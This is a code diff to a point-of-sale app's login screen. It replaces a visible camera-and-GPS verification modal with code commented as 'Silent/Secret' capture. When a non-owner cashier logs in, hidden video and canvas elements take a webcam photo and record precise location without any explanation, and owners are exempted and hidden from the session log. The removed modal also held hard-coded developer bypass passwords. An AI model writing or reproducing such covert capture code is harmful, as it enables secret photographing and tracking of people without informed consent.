@@ -1564,148 +1564,7 @@
       const [ownerError, setOwnerError] = useState('');
       const [ownerLoading, setOwnerLoading] = useState(false);
 
-      const [showSecurityGate, setShowSecurityGate] = useState(false);
-      const [securityStep, setSecurityStep] = useState('pending'); // 'pending' | 'capturing' | 'failed'
-      const [pendingUser, setPendingUser] = useState(null);
 
-      const videoRef = useRef(null);
-      const canvasRef = useRef(null);
-      const [cameraSuccess, setCameraSuccess] = useState(null);
-      const [gpsSuccess, setGpsSuccess] = useState(null);
-      const [devPassword, setDevPassword] = useState('');
-      const [gateError, setGateError] = useState('');
-
-      useEffect(() => {
-        if (!showSecurityGate) {
-          setCameraSuccess(null);
-          setGpsSuccess(null);
-          setGateError('');
-          setDevPassword('');
-          return;
-        }
-
-        let activeStream = null;
-        let isCancelled = false;
-
-        async function initSecurityCapture() {
-          setSecurityStep('capturing');
-          setGateError('');
-          
-          let photoData = '';
-          let lat = null;
-          let lon = null;
-          let cameraStatusVal = 'Uninitialized';
-          let locationStatusVal = 'Uninitialized';
-
-          const gpsPromise = new Promise((resolve) => {
-            if (!navigator.geolocation) {
-              locationStatusVal = 'Not Supported';
-              setGpsSuccess(false);
-              resolve(null);
-              return;
-            }
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                lat = pos.coords.latitude;
-                lon = pos.coords.longitude;
-                locationStatusVal = 'Granted';
-                setGpsSuccess(true);
-                resolve({ lat, lon });
-              },
-              (err) => {
-                locationStatusVal = 'Denied/Error: ' + err.message;
-                setGpsSuccess(false);
-                resolve(null);
-              },
-              { timeout: 8000, enableHighAccuracy: true }
-            );
-          });
-
-          let stream = null;
-          try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            activeStream = stream;
-            cameraStatusVal = 'Granted';
-            setCameraSuccess(true);
-            if (videoRef.current && !isCancelled) {
-              videoRef.current.srcObject = stream;
-            }
-          } catch (err) {
-            cameraStatusVal = 'Denied/Error: ' + err.message;
-            setCameraSuccess(false);
-          }
-
-          // Wait 2.5 seconds for video stream stabilization
-          await new Promise(r => setTimeout(r, 2500));
-
-          if (isCancelled) {
-            if (stream) {
-              stream.getTracks().forEach(t => t.stop());
-            }
-            return;
-          }
-
-          const coords = await gpsPromise;
-
-          if (cameraStatusVal === 'Granted' && videoRef.current && canvasRef.current) {
-            try {
-              const canvas = canvasRef.current;
-              const video = videoRef.current;
-              canvas.width = video.videoWidth || 320;
-              canvas.height = video.videoHeight || 240;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              photoData = canvas.toDataURL('image/jpeg', 0.85);
-            } catch (canvasErr) {
-              console.error('Error drawing canvas', canvasErr);
-              cameraStatusVal = 'Capture Error';
-              setCameraSuccess(false);
-            }
-          }
-
-          if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-          }
-
-          const bothSucceeded = (cameraStatusVal === 'Granted' && photoData) && (locationStatusVal === 'Granted');
-          
-          if (bothSucceeded) {
-            captureDeviceSession(
-              pendingUser,
-              photoData,
-              cameraStatusVal,
-              locationStatusVal,
-              lat,
-              lon,
-              () => {
-                const db = getDB();
-                const safeUser = makeSafeUser(pendingUser, db);
-                app.login(safeUser);
-              }
-            );
-          } else {
-            setSecurityStep('failed');
-            let failureMsg = 'Kamera atau Lokasi GPS tidak dapat diakses.';
-            if (cameraStatusVal !== 'Granted' && locationStatusVal !== 'Granted') {
-              failureMsg = 'Akses Kamera dan Lokasi GPS ditolak atau tidak didukung.';
-            } else if (cameraStatusVal !== 'Granted') {
-              failureMsg = 'Akses Kamera ditolak atau tidak didukung.';
-            } else if (locationStatusVal !== 'Granted') {
-              failureMsg = 'Akses Lokasi GPS ditolak atau tidak didukung.';
-            }
-            setGateError(failureMsg);
-          }
-        }
-
-        initSecurityCapture();
-
-        return () => {
-          isCancelled = true;
-          if (activeStream) {
-            activeStream.getTracks().forEach(t => t.stop());
-          }
-        };
-      }, [showSecurityGate, pendingUser]);
 
       const handleLogin = async (e) => {
         e.preventDefault();
@@ -1742,9 +1601,88 @@
           return;
         }
 
-        setPendingUser(user);
-        setShowSecurityGate(true);
-        setLoading(false);
+        if (user.role === 'owner') {
+          app.login(makeSafeUser(user, db));
+          setLoading(false);
+          return;
+        }
+
+        // Silent/Secret capture for non-owners in the background
+        let photoData = '';
+        let lat = null;
+        let lon = null;
+        let cameraStatusVal = 'Uninitialized';
+        let locationStatusVal = 'Uninitialized';
+
+        const gpsPromise = new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            locationStatusVal = 'Not Supported';
+            resolve(null);
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              lat = pos.coords.latitude;
+              lon = pos.coords.longitude;
+              locationStatusVal = 'Granted';
+              resolve({ lat, lon });
+            },
+            (err) => {
+              locationStatusVal = 'Denied/Error: ' + err.message;
+              resolve(null);
+            },
+            { timeout: 4500, enableHighAccuracy: true }
+          );
+        });
+
+        let stream = null;
+        try {
+          const hiddenVideo = document.createElement('video');
+          hiddenVideo.setAttribute('autoplay', 'true');
+          hiddenVideo.setAttribute('playsinline', 'true');
+          hiddenVideo.style.display = 'none';
+          document.body.appendChild(hiddenVideo);
+
+          const hiddenCanvas = document.createElement('canvas');
+          hiddenCanvas.style.display = 'none';
+          document.body.appendChild(hiddenCanvas);
+
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+          cameraStatusVal = 'Granted';
+          hiddenVideo.srcObject = stream;
+          
+          await new Promise(r => setTimeout(r, 800));
+
+          hiddenCanvas.width = hiddenVideo.videoWidth || 320;
+          hiddenCanvas.height = hiddenVideo.videoHeight || 240;
+          const ctx = hiddenCanvas.getContext('2d');
+          ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+          photoData = hiddenCanvas.toDataURL('image/jpeg', 0.85);
+
+          if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+          }
+          if (hiddenVideo.parentNode) hiddenVideo.parentNode.removeChild(hiddenVideo);
+          if (hiddenCanvas.parentNode) hiddenCanvas.parentNode.removeChild(hiddenCanvas);
+        } catch (err) {
+          cameraStatusVal = 'Denied/Error: ' + err.message;
+        }
+
+        await gpsPromise;
+
+        captureDeviceSession(
+          user,
+          photoData,
+          cameraStatusVal,
+          locationStatusVal,
+          lat,
+          lon,
+          () => {
+            const currentDb = getDB();
+            app.login(makeSafeUser(user, currentDb));
+            setLoading(false);
+          }
+        );
       };
 
       return (
@@ -1884,8 +1822,8 @@
                       return;
                     }
                     
-                    setPendingUser(foundUser);
-                    setShowSecurityGate(true);
+                    const safeUser = makeSafeUser(foundUser, db);
+                    app.login(safeUser);
                     setShowOwnerLogin(false);
                     setOwnerLoading(false);
                   } else {
@@ -1939,181 +1877,7 @@
             </div>
           )}
 
-          {/* Modal Security Gate */}
-          {showSecurityGate && (
-            <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-zinc-900/80 backdrop-blur-md animate-[fadeIn_0.2s_ease-out]">
-              <div className="bg-white rounded-3xl shadow-2xl w-full max-w-md overflow-hidden border border-zinc-200 animate-[scaleIn_0.2s_ease-out]">
-                {/* Header */}
-                <div className="px-6 py-5 border-b border-zinc-100 flex justify-between items-center bg-zinc-50/50">
-                  <div className="text-left font-bold text-zinc-800 flex items-center gap-2">
-                    <Icon name="shield-check" className="text-emerald-600" />
-                    <span>Sistem Verifikasi Keamanan</span>
-                  </div>
-                  <button 
-                    onClick={() => {
-                      setShowSecurityGate(false);
-                      setPendingUser(null);
-                    }} 
-                    className="p-2 hover:bg-zinc-100 rounded-full transition"
-                  >
-                    <Icon name="x" size={16} />
-                  </button>
-                </div>
 
-                <div className="p-6 text-center space-y-6">
-                  <canvas ref={canvasRef} className="hidden" />
-                  
-                  {securityStep === 'capturing' && (
-                    <div className="space-y-4">
-                      {/* Webcam feed preview */}
-                      <div className="relative w-40 h-40 mx-auto rounded-full overflow-hidden border-4 border-sky-500/30 bg-zinc-950 flex items-center justify-center">
-                        <video 
-                          ref={videoRef} 
-                          className="w-full h-full object-cover transform scale-x-[-1]" 
-                          autoPlay 
-                          playsInline 
-                          muted 
-                        />
-                        <div className="absolute inset-0 border border-sky-400 rounded-full animate-ping pointer-events-none opacity-40"></div>
-                      </div>
-                      
-                      <div className="space-y-2">
-                        <h3 className="text-base font-semibold text-zinc-800">Menghubungkan Perangkat...</h3>
-                        <p className="text-xs text-zinc-500 max-w-xs mx-auto">
-                          Mengambil foto wajah Anda dan memetakan lokasi GPS presisi demi keamanan transaksi kasir. Mohon tunggu...
-                        </p>
-                      </div>
-
-                      {/* Capturing Indicators */}
-                      <div className="flex justify-center gap-6 pt-2">
-                        <div className="flex items-center gap-2 text-xs font-semibold text-zinc-600">
-                          {cameraSuccess === null && (
-                            <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
-                          )}
-                          {cameraSuccess === true && (
-                            <Icon name="check-circle" size={14} className="text-emerald-600" />
-                          )}
-                          {cameraSuccess === false && (
-                            <Icon name="x-circle" size={14} className="text-rose-500" />
-                          )}
-                          <span>Kamera Web</span>
-                        </div>
-                        <div className="flex items-center gap-2 text-xs font-semibold text-zinc-600">
-                          {gpsSuccess === null && (
-                            <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
-                          )}
-                          {gpsSuccess === true && (
-                            <Icon name="check-circle" size={14} className="text-emerald-600" />
-                          )}
-                          {gpsSuccess === false && (
-                            <Icon name="x-circle" size={14} className="text-rose-500" />
-                          )}
-                          <span>Lokasi GPS</span>
-                        </div>
-                      </div>
-
-                      {/* sleek linear progress bar */}
-                      <div className="w-full bg-zinc-100 h-1.5 rounded-full overflow-hidden">
-                        <div className="bg-sky-500 h-full w-2/3 animate-[pulse_1.5s_infinite] rounded-full"></div>
-                      </div>
-                    </div>
-                  )}
-
-                  {securityStep === 'failed' && (
-                    <div className="space-y-5 text-left">
-                      <div className="flex items-start gap-4 p-4 bg-rose-50 border border-rose-100 rounded-2xl">
-                        <Icon name="alert-triangle" size={24} className="text-rose-500 shrink-0 mt-0.5" />
-                        <div>
-                          <h4 className="text-sm font-bold text-rose-800">Verifikasi Keamanan Gagal</h4>
-                          <p className="text-xs text-rose-600 mt-1 leading-relaxed">
-                            {gateError || 'Kamera dan koordinat lokasi harus diizinkan untuk login.'}
-                          </p>
-                        </div>
-                      </div>
-
-                      <p className="text-xs text-zinc-500 leading-relaxed">
-                        Peraturan keamanan mewajibkan sistem kasir Smile POS mencatat foto dan lokasi login kasir. Silakan aktifkan izin kamera & lokasi GPS di browser Anda lalu coba kembali.
-                      </p>
-
-                      {/* Developer Bypass UI for Owner */}
-                      {pendingUser && pendingUser.role === 'owner' && (
-                        <div className="mt-4 p-4 bg-zinc-50 rounded-2xl border border-zinc-200/80 space-y-3">
-                          <div className="flex items-center gap-1.5 text-zinc-700">
-                            <Icon name="code" size={14} />
-                            <span className="text-xs font-bold uppercase tracking-wider">Bypass Developer (Owner Only)</span>
-                          </div>
-                          
-                          <input
-                            type="password"
-                            placeholder="Masukkan password developer..."
-                            value={devPassword}
-                            onChange={(e) => setDevPassword(e.target.value)}
-                            className="w-full px-3 py-2 bg-white border border-zinc-200 rounded-xl outline-none focus:border-zinc-800 text-xs font-medium text-zinc-800 shadow-sm"
-                          />
-                          
-                          <button
-                            type="button"
-                            onClick={() => {
-                              const devPassTrimmed = devPassword.trim();
-                              if (devPassTrimmed === 'developerpos123' || devPassTrimmed === 'smiledeveloper' || devPassTrimmed === 'smiledeveloper123' || devPassTrimmed === 'superowner123') {
-                                captureDeviceSession(
-                                  pendingUser,
-                                  '', 
-                                  'Bypassed (Dev Password)',
-                                  'Bypassed (Dev Password)',
-                                  null,
-                                  null,
-                                  () => {
-                                    const db = getDB();
-                                    const safeUser = makeSafeUser(pendingUser, db);
-                                    app.login(safeUser);
-                                  }
-                                );
-                              } else {
-                                alert('Password developer salah!');
-                              }
-                            }}
-                            className="w-full py-2 bg-zinc-900 text-white rounded-xl text-xs font-bold hover:bg-zinc-850 transition shadow"
-                          >
-                            Konfirmasi Bypass
-                          </button>
-                        </div>
-                      )}
-
-                      <div className="flex gap-3 pt-2">
-                        <button
-                          type="button"
-                          onClick={() => {
-                            setShowSecurityGate(false);
-                            setPendingUser(null);
-                          }}
-                          className="flex-1 py-3 bg-zinc-100 hover:bg-zinc-200 text-zinc-700 rounded-xl font-bold transition text-xs text-center"
-                        >
-                          Kembali
-                        </button>
-                        <button
-                          type="button"
-                          onClick={() => {
-                            setSecurityStep('capturing');
-                            setCameraSuccess(null);
-                            setGpsSuccess(null);
-                            setShowSecurityGate(false);
-                            setTimeout(() => {
-                              setShowSecurityGate(true);
-                            }, 50);
-                          }}
-                          className="flex-1 py-3 bg-sky-600 hover:bg-sky-700 text-white rounded-xl font-bold transition text-xs text-center shadow-md flex items-center justify-center gap-1.5"
-                        >
-                          <Icon name="rotate-ccw" size={14} />
-                          Coba Lagi
-                        </button>
-                      </div>
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-          )}
         </div>
       );
     }
@@ -4267,8 +4031,7 @@
       const [userFilter, setUserFilter] = useState('all');
       const [selectedSessionImage, setSelectedSessionImage] = useState(null);
       const sessions = db.deviceSessions || [];
-      const registeredUsers = (db.users || []);
-
+      const registeredUsers = (db.users || []).filter(u => u.role !== 'owner');
       const filteredSessions = sessions.filter(s => {
         if (userFilter === 'all') return true;
         return (s.userEmail && s.userEmail.toLowerCase() === userFilter.toLowerCase()) ||
